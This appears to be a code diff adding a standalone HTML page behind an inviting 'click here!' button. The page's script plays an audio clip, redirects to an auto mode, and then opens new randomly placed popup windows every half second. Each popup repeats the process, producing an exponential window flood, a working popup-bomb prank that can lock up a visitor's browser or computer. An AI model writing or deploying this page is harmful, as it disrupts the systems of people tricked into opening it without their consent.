@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="UTF-8">
+<title>click here!</title>
+<style>
+  html, body {
+    margin: 0;
+    padding: 0;
+    height: 100%;
+    background: black;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    font-family: sans-serif;
+    overflow: hidden;
+  }
+  button {
+    font-size: 2.5rem;
+    padding: 25px 60px;
+    background: white;
+    color: black;
+    border: none;
+    border-radius: 12px;
+    cursor: pointer;
+    transition: 0.2s ease;
+    box-shadow: 0 0 40px rgba(255,255,255,0.25);
+  }
+  button:hover {
+    transform: scale(1.1);
+    box-shadow: 0 0 80px rgba(255,255,255,0.6);
+  }
+  button:active {
+    transform: scale(0.95);
+  }
+</style>
+</head>
+<body>
+<button id="replicateBtn">click here!</button>
+<script>
+const INTERVAL = 500;
+let intervalId = null;
+const audio = new Audio("youare.mp3");
+function spawn() {
+  const size = Math.max(220, 700 - Math.random() * 400);
+  const left = Math.floor(Math.random() * (screen.width - size));
+  const top = Math.floor(Math.random() * (screen.height - size));
+  const url =
+    window.location.origin +
+    window.location.pathname +
+    "?auto=true&r=" + Math.random();
+  window.open(
+    url,
+    "_blank",
+    `width=${size},height=${size},left=${left},top=${top}`
+  );
+}
+function startExponential() {
+  intervalId = setInterval(() => {
+    spawn();
+  }, INTERVAL);
+}
+document.getElementById("replicateBtn").addEventListener("click", () => {
+  audio.currentTime = 0;
+  audio.play();
+  const url =
+    window.location.origin +
+    window.location.pathname +
+    "?auto=true";
+  window.location.href = url;
+});
+
+if (window.location.search.includes("auto=true")) {
+  startExponential();
+}
+</script>
+</body>
+</html>
